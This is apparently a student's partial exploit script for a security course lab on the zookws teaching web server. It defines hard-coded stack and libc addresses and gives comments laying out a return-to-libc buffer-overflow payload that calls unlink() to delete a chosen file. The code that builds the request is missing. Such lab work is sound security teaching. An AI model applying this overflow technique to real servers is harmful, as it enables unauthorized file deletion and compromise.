## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0x34567890

stack_saved_ebp = 0xbfffde08 # addresss in ebp at http_request_headers. seems to change. you can obtain it by doing info r ebp
unlink_addr = 0x40101630 # address of unlink() at libc
stack_retaddr = stack_saved_ebp + 4
str_addr = stack_retaddr + 12 # counting from retaddr, 4 bytes of GARB, 4 bytes of str_addr itself, and 4 more bytes to point at actual string
serve_none_addr = 0x80495ea # address for http_serve_none so handler is called successfully

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded

    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)

    # fill up all of pn until call to handler()
    # address of http_serve_none in handler() as we need http_serve to return
    # 12 bytes of junk until we reach above ebp
    # we place the address of unlink()
    # we place GARBage ret address
    # we place pointer str_addr to argument
    # we place string with file to delete's filename
